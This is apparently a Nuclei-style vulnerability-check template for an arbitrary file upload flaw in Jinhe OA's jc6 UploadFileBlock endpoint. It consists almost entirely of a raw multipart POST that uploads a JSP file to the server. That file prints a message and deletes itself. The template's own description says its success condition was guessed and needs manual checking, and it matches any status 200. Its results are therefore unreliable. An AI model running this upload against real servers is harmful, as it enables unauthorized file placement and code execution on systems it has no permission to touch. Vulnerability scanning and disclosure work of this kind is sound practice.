id: poc-akqwcqanaoecp3ea
info:
  name: 金和OA-jc6-UploadFileBlock存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0

    Accept: */*

    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.8

    Connection: close

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5iALAXlSiqxJXrhK

    ------WebKitFormBoundary5iALAXlSiqxJXrhK

    Content-Disposition: form-data; name="filename"; filename="123.jsp"

    <% out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>

    ------WebKitFormBoundary5iALAXlSiqxJXrhK--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
